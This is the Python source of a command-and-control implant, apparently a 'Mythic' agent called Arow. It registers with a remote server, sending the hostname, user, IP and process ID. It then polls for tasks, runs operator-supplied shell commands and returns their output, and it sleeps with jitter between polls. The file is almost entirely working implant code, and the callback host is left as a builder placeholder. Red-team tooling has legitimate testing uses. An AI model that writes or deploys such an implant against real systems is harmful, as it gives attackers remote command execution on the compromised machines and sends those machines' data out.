#!/usr/bin/env python3
"""
Arow Linux Agent - Simple Mythic callback agent written in Python
"""
import requests
import json
import time
import random
import base64
import uuid
import os
import sys
# Command imports under this comment are used in the COMMANDS registry to link Mythic commands to their handler functions
from commands import shell as cmd_shell
from commands import exit as cmd_exit

# --- Injected by builder via string substitution ---
CALLBACK_HOST   = "REPLACE_CALLBACK_HOST"
CALLBACK_PORT   = int("REPLACE_CALLBACK_PORT")
SLEEP_INTERVAL  = float("REPLACE_SLEEP_INTERVAL")
JITTER          = float("REPLACE_JITTER")
AGENT_UUID      = "REPLACE_UUID"
# ---------------------------

# Construct base URL for C2 communication
BASE_URL = f"{CALLBACK_HOST}:{CALLBACK_PORT}"
# Creates persistent session for connection pooling and performance
SESSION  = requests.Session()

# Calculates jittered sleep time based on configured interval and jitter percentage
def get_sleep_time():
    jitter_amount = SLEEP_INTERVAL * (JITTER / 100)
    return SLEEP_INTERVAL + random.uniform(-jitter_amount, jitter_amount)

# Initial checkin to register this agent with Mythic, including system information and returning the callback ID assigned by Mythic for this agent
def checkin():
    import platform, socket
    checkin_data = {
        "action":         "checkin",
        "uuid":           AGENT_UUID,
        "ips":            [socket.gethostbyname(socket.gethostname())],
        "os":             platform.system(),
        "user":           os.getlogin(),
        "host":           socket.gethostname(),
        "pid":            os.getpid(),
        "architecture":   platform.machine(),
        "domain":         "",
        "integrity_level": 2,
        "external_ip":    "",
    }
    try:
        r = SESSION.post(
            f"{BASE_URL}/agent_message",
            data=base64.b64encode((AGENT_UUID + json.dumps(checkin_data)).encode()),
            timeout=10
        )
        resp = json.loads(base64.b64decode(r.content)[36:])
        return resp.get("id")  # Mythic returns a new callback UUID
    except Exception as e:
        return None

# Polls Mythic for new tasks using the get_tasking action, including the callback ID as a parameter so Mythic knows which agent is asking for tasks, and returns the list of tasks as JSON objects
def get_tasks(callback_id):
    try:
        msg = {
            "action": "get_tasking", # tells Mythic this is a tasking poll
            "tasking_size": 1,       # ask for at most 1 task at a time
            "uuid": callback_id,     # include the callback ID so Mythic knows which agent is asking for tasks
        }
        r = SESSION.post(
            f"{BASE_URL}/agent_message",
            data=base64.b64encode((callback_id + json.dumps(msg)).encode()),
            timeout=10
        )
        resp = json.loads(base64.b64decode(r.content)[36:])
        return resp.get("tasks", [])
    except:
        return []

# Posts task output back to Mythic using the post_response action, including the callback ID, task ID, and output as parameters
def post_response(callback_id, task_id, output):
    try:
        msg = {
            "action":    "post_response",
            "uuid":      callback_id,
            "responses": [{
                "task_id":         task_id,
                "user_output":     output,
                "completed":       True,
                "status":          "completed",
            }]
        }
        SESSION.post(
            f"{BASE_URL}/agent_message",
            data=base64.b64encode((callback_id + json.dumps(msg)).encode()),
            timeout=10
        )
    except:
        pass

# Add newly implemented commands here, linking the command name (must match task.get("command") in agent.py) to the handler function defined in the corresponding command file in agent_functions
COMMANDS = {
    "shell": cmd_shell.execute,
    "exit":  cmd_exit.execute,
}

# Handles a single task by looking up the command in the registry and executing it
def handle_task(task, callback_id):
    # Extract command, task ID, and parameters from the task JSON object
    cmd     = task.get("command", "")
    task_id = task.get("id", "")
    params  = task.get("parameters", "")

    handler = COMMANDS.get(cmd)
    if handler:
        output = handler(params, task_id, callback_id)
        post_response(callback_id, task_id, output)
        # Exit must terminate the process after the response is sent
        if cmd == "exit":
            sys.exit(0)
    else:
        post_response(callback_id, task_id, f"Unknown command: {cmd}")

# Main program loop that performs initial checkin to obtain callback ID, then continuously polls for tasks and handles them, sleeping between polls with jitter
def main():

    # Initial callback_id to register with Mythic and obtain callback ID, will get changed once a checkin() occurs
    callback_id = None

    # Retry checkin loop until callback ID is obtained, sleeping between attempts with jitter to avoid hammering the C2 server if it's not available yet
    while not callback_id:
        callback_id = checkin()
        if not callback_id:
            time.sleep(get_sleep_time())

    # Main tasking loop
    while True:
        # Fetch tasking from Mythic and execute tasks, storing tasks in an array that represents all the JSON objects returned from Mythic, then iterating over that array and handling each task with the handle_task function
        tasks = get_tasks(callback_id)
        for task in tasks:
            # Handle each task
            handle_task(task, callback_id)
        # Sleep until the next checkin, with jitter
        time.sleep(get_sleep_time())

if __name__ == "__main__":
    # Execute the main program loop
    main()